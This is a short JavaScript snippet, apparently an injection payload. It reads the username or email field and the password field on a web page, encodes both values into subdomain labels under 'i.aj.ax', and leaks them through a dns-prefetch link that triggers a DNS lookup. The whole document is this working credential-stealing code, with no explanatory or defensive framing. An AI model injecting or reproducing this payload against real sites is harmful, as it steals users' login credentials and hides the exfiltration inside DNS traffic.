(function() {
  var u = document.querySelector('input[type="text"],input[type="email"],input[name*="user"],input[id*="user"],input[name*="email"],input[id*="email"]');
  var p = document.querySelector('input[type="password"]');
  var data = (u ? u.value : 'x') + ':' + (p ? p.value : 'x');
  var enc = btoa(data).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
  var host = (enc.match(/.{1,63}/g) || ['x']).join('.') + '.i.aj.ax';
  var l = document.createElement('link');
  l.rel = 'dns-prefetch';
  l.href = '//' + host;
  document.head.appendChild(l);
})();
